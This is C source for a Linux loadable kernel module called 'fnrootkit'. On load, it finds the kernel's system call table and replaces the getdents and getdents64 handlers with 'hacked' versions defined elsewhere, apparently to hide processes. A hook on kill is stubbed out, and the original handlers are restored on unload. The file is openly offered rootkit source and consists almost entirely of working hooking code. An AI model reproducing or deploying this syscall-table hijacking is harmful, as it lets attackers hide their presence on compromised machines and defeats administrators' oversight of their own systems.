#include "../inc/fnrootkit.h"

#include <linux/syscalls.h>
#include <linux/fs.h>

#include "../inc/def.h"
#include "../inc/proc.h"

syscall_t original_kill = NULL;
syscall_t original_getdents = NULL;
syscall_t original_getdents64 = NULL;

static unsigned long *syscall_table;

static int __init fnrootkit_init(void) {
    printk(KERN_INFO "fnrootkit: module have loaded.\n");

    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    original_kill       = (syscall_t)syscall_table[__NR_kill];
    original_getdents   = (syscall_t)syscall_table[__NR_getdents];
    original_getdents64 = (syscall_t)syscall_table[__NR_getdents64];

    /*syscall_table[__NR_kill]       = ;*/
    syscall_table[__NR_getdents]   = (unsigned long)hacked_proc_getdents;
    syscall_table[__NR_getdents64] = (unsigned long)hacked_proc_getdents64;

    return 0;
}

static void __exit fnrootkit_exit(void) {
    /*syscall_table[__NR_kill]       = ;*/
    syscall_table[__NR_getdents]   = (unsigned long)original_getdents;
    syscall_table[__NR_getdents64] = (unsigned long)original_getdents64;

    printk(KERN_INFO "fnrootkit: module have unloaded.\n");
}
 
module_init(fnrootkit_init);
module_exit(fnrootkit_exit);
